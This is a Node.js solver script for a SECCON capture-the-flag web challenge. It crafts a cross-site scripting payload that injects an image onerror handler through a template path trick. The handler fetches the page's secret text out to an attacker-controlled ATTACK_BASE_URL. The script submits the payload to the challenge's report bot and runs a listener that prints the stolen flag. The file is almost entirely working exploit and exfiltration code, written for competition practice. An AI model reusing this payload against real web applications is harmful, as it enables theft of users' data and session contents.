const fastify = require("fastify")();

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const SECCON_BASE_URL =
  process.env.SECCON_BASE_URL ?? fail("No SECCON_BASE_URL");
const ATTACK_BASE_URL =
  process.env.ATTACK_BASE_URL ?? fail("No ATTACK_BASE_URL");

const LISTEN_PORT = process.env.PORT ?? "8080";

const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));

const exploit = async () => {
  const emoji = "0/ownerDocument/defaultView/RegExp/rightContext";
  const message = `{{emoji}} S{{emoji}}<p id="}<img src=0 onerror=fetch(\`${ATTACK_BASE_URL}/?text=\`+encodeURIComponent(document.all.message.textContent))>"></p><script><`;
  const url = `http://web:3000/result?${new URLSearchParams({
    emoji,
    message,
  })}`;

  const res = await (
    await fetch(`${SECCON_BASE_URL}/report`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        url,
      }),
    })
  ).text();
  console.log(res); // "Received :)"
};

const start = async () => {
  fastify.get("/", async (req, reply) => {
    const text = req.query.text;

    // Print a flag
    console.log("S" + text);
    // -> SECCON{this_is_real_flag} SECCON{REDACTED}">

    process.exit(0);
  });

  fastify.listen(
    { port: LISTEN_PORT, host: "0.0.0.0" },
    async (err, address) => {
      if (err) {
        fastify.log.error(err);
        process.exit(1);
      }

      await sleep(1000);
      await exploit();

      await sleep(5000);
      console.log("Failed");
      process.exit(1);
    }
  );
};
start();
